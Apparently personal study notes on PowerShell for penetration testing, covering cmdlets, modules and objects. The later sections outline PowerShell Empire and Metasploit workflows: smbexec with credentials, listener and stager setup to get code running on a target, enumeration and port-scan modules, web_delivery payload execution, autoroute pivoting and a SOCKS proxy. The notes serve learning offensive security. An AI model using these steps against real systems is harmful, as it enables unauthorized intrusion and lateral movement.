# Powershell

**Why powershell?**
- Many orgs aren't actively hunting powershell activity. Since it native for Windows
- Widely support and have great feature.
    - Able to call .Net and Windows APIs
    - Can call dll functions within powershell
    - Many tools related to penetration test

[Living off the land](https://www.kiteworks.com/risk-compliance-glossary/living-off-the-land-attacks/)

[Powersploit](https://github.com/PowerShellMafia/PowerSploit) post expliot powershell framework

CmdLets: Light-weight powershell scipt that perform a single function:
    - Instances of .Net class `Cmdlet Base Class`
    - Typically written in a "Verb-Noun` file name format
        - EX: `Get-Help`, `Invoke-Command`
    - We can create a custome cmdlet by our own
    - Output in pileline
        - Eg: `Get-Process | Sort-Object -Unique | Select-Object ProcessName`

Helpful cmdlet:
    - Get-Process
    - Get-ChildItem
    - Get-WmiObject
    - Get-Service

Modules: Set of powershell function group together (Like lib)
    - `.psm1` File extension
    - Type:
        - Script module
        - Binary module
        - Manifest module
        - Dynamic module (Create dynamic by script when use `New-Module` command)
    - `Get-Module -ListAvailble`
    - `Import-Module`

Objects: All data on powershell is a object, it have properties and method attach to it
- Create new object: `New-Object`
    - Eg: `$webclient = New-Object System.Net.Webclient`
- Search for object `Search-Object`

---

## Powershell emprire

- Using smbexec.py script
    - `smbexec.py <user>:<password>@<tartget>`
- Setup server and client to run powershell emprire
- Setup listener `userlistener http` http listener
    - Setup host and port `set Host <ip>` `set Port <80>`
    - `execute` (Like `run` or `exploit` in msf)
    - `listeners` to list the listerner
- `usestager/multi/launcher` To generate payload
    - `set Listener http` set listerner for this module
    - It generate powershell command to run on target
    - Use `agents` to list the agents (Agent ~ sessions in msf)
- Use `interact <listener_id>`
- `usemodule/powershell/situaional ..../host/computerdetails` ~ Post exploit enum 
    - `execute`
- `usemodule powershell/situa......./network/portscan` Portscan module
    - set Host and run

To Exploit:
- We can setup: `web_delivery` with msf -> Return payload and URL host the payload
- Then `usemodule powershell/code_execution/invoke metasploitpayload`
    - `set URL <metasploit_web_delivery_server>` -> `execute`
- Then we can use `multi/manage/autoroute` to pivoting
- We can use module auxiliary `socks_proxy` to able to access via browers
    - set `SVRHOST` and run
    - Open brower and setup proxy (Manual proxy, Host ip, port 1080)

---

**Stalkiller**: GUI for Powershell-Empire
- Need to setup Powershll-Empire server and client first
- Simple flow: Create listerner -> Stager -> Ship it and run -> Agents created
- In stalkiller, agents provide GUI for file system, Interact shell, metadata, tasks
    - All actions will have UI component for it
    - We can `execute module` for post module exploit

